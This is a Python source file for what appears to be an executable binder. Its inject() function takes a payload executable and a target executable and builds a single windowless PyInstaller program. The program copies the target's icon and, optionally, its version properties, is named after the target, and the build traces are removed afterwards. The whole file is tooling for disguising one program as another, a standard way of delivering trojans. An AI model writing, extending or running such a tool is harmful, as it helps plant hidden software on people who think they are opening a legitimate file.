import os
from shutil import rmtree, copy2
from resources.properties_manager import *
from resources.file_manager import *

def inject(file_to_inject, target_file, clone_properties):
    if os.path.isdir('cached_files'):
        rmtree('cached_files')
    if os.path.isdir('temporary_files'):
        rmtree('temporary_files')
    os.mkdir('cached_files')
    os.mkdir('temporary_files')

    if clone_properties:
        clone_file_properties(target_file)

    if os.path.isfile(file_to_inject) and os.path.isfile(target_file):
        copy2(file_to_inject, 'cached_files/inject.exe')
        copy2(target_file, 'cached_files/target.exe')

        generate_file_loader('==')

        pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& pyinstaller -F -w ' + ('--version-file "temporary_files/version.txt" ' if clone_properties else '') + '--add-data "cached_files/inject.exe;cached_files" --add-data "cached_files/target.exe;cached_files" --icon "cached_files/target.exe" "temporary_files/file_loader.py" & pause & exit"'
        #pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& resources\Python310\python.exe resources\Python310\Scripts\pyinstaller.exe -F -w ' + ('--version-file "temporary_files/version.txt" ' if clone_properties else '') + '--add-data "cached_files/inject.exe;cached_files" --add-data "cached_files/target.exe;cached_files" --icon "cached_files/target.exe" "temporary_files/file_loader.py" & pause & exit"'
        os.system(pyinstaller_command)
        input('Press [ENTER] when processing in new window will end: ')
        print('If running generated executable will produce error, just change its name')

        if 'file_loader.spec' in os.listdir('.'):
            os.system('del file_loader.spec')
        if '__pycache__' in os.listdir('.'):
            rmtree('__pycache__')
        if 'build' in os.listdir('.'):
            rmtree('build')
        if 'cached_files' in os.listdir('.'):
            rmtree('cached_files')
        if 'temporary_files' in os.listdir('.'):
            rmtree('temporary_files')

        output_name = target_file.replace('\\', '/').split('/')[-1][:-4]
        os.system('move dist\\file_loader.exe ' + output_name + '_output.exe')

        if 'dist' in os.listdir('.'):
            rmtree('dist')

        os.system('cls')
        print('File building finished.')

    else:
        print('asd')
